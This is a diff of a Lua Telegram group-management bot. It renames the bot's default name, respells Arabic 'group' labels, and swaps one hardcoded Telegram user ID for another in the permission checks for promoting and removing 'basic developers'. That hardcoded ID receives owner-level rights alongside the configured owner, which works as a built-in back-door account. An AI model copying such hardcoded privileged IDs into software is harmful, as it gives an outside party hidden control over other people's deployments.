@@ -1,7 +1,7 @@
 function setrtb(msg)
 text = nil
 if msg and msg.content and msg.content.text then
-xname =  (Redis:get(Fast.."Name:Bot") or "قيصر") 
+xname =  (Redis:get(Fast.."Name:Bot") or "سيدثون") 
 text = msg.content.text.text
 if text:match("^"..xname.." (.*)$") then
 text = text:match("^"..xname.." (.*)$")
@@ -71,9 +71,9 @@ if text and text:match('^رفع مطور اساسي @(%S+)$') then
 local UserName = text:match('^رفع مطور اساسي @(%S+)$')
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
@@ -102,9 +102,9 @@ if text and text:match('^تنزيل مطور اساسي @(%S+)$') then
 local UserName = text:match('^تنزيل مطور اساسي @(%S+)$')
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
@@ -132,9 +132,9 @@ end
 if text == ('رفع مطور اساسي') and msg.reply_to_message_id ~= 0 then
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
@@ -160,9 +160,9 @@ end
 if text == ('تنزيل مطور اساسي') and msg.reply_to_message_id ~= 0 then
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
@@ -189,9 +189,9 @@ if text and text:match('^رفع مطور اساسي (%d+)$') then
 local UserId = text:match('^رفع مطور اساسي (%d+)$')
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
@@ -214,9 +214,9 @@ if text and text:match('^تنزيل مطور اساسي (%d+)$') then
 local UserId = text:match('^تنزيل مطور اساسي (%d+)$')
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
@@ -238,9 +238,9 @@ end
 if text == 'مسح المطورين الاساسيين' then
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
@@ -258,9 +258,9 @@ end
 if text == 'المطورين الاساسيين' then
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(6264438859) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
@@ -2766,11 +2766,11 @@ end
 local UserInfo = bot.getUser(senderr)
 local StatusMember = bot.getChatMember(msg_chat_id,senderr).status.Fastbots
 if (StatusMember == "chatMemberStatusCreator") then
-StatusMemberChat = 'مالك الجروب'
+StatusMemberChat = 'مالك الكروب'
 elseif (StatusMember == "chatMemberStatusAdministrator") then
-StatusMemberChat = 'مشرف الجروب'
+StatusMemberChat = 'مشرف الكروب'
 else
-StatusMemberChat = 'عضو في الجروب'
+StatusMemberChat = 'عضو في الكروب'
 end
 local UserId = senderr
 local RinkBot = Redis:get(Fast..':SetRt'..msg.chat_id..':'..UserId) or msg.Name_Controller
